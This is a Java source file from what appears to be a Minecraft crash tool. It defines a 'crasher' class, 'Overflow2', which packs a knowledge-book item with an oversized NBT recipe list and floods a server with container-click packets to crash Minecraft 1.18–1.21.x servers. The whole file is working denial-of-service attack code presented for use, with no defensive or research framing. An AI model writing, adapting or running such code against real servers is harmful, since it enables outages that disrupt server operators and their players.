package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Optional;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.helpers.BypassHelper.StringType;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Overflow2 implements Crasher {
    private static final String METHOD_NAME = "Overflow2";
    private boolean enabled = false;

    public Overflow2() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int length = Integer.parseInt(args[4]);
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        CompoundTag compoundTag = new CompoundTag();
        ListTag listTag = new ListTag();

        for(int i = 0; i < size; ++i) {
            listTag.add(new StringTag(bypassHelper.generateString(length, StringType.DEFAULT)));
        }

        compoundTag.put("Recipes", listTag);
        ItemStack stack = new ItemStack(Items.KNOWLEDGE_BOOK, 1, Optional.of(compoundTag));

        for(int i = 0; i < packets; ++i) {
            PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, stack, new Int2ObjectOpenHashMap()));
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    public String getName() {
        return "Overflow2";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER, (String[])null), new OptionUtil("Size", OptionType.INTEGER, (String[])null), new OptionUtil("Length", OptionType.INTEGER, (String[])null));
    }

    public String getArgsUsage() {
        return "packets[500], Size[35000], Length[0]";
    }

    public String getDescription() {
        return "Basic NBT 1.18-1.21.x Crasher";
    }
}
